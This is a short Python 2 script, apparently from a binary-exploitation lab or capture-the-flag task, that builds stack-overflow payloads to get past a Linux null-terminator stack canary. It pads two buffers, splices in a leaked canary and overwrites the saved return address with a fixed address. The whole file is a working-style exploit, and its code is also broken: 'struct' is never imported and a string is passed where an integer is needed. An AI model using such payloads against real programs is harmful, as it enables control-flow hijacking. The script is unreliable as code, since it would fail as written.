#!/usr/bin/python
import sys

# Exploit Linux randomized null terminator canaries with 2 buffers

def lp(s, n):
	return "0"*(n-len(s))+s

def reverse_and_escape(hexstring):
	return struct.pack("<I", int(hexstring, 16)).encode('string_escape')


''' Exploit parameters '''
canary_hex_little = sys.argv[1]
eip_offset_1 = 34*4
eip_offset_2 = 34*4
eip_hex_str = "804876c"


eip_escaped = struct.pack("<I", eip_hex_str).encode('string_escape')
canary_offset_1 = eip_offset_1 - 8
print "A"*canary_offset_1+"B"+reverse_and_escape(canary_hex_little)[1*4:]+"CCCC"*3+eip_escaped # skip the first null byte

canary_offset_2 = eip_offset_2 - 8
print "A"*canary_offset_2 # implicit "\x00" will be added when string is input, and copied

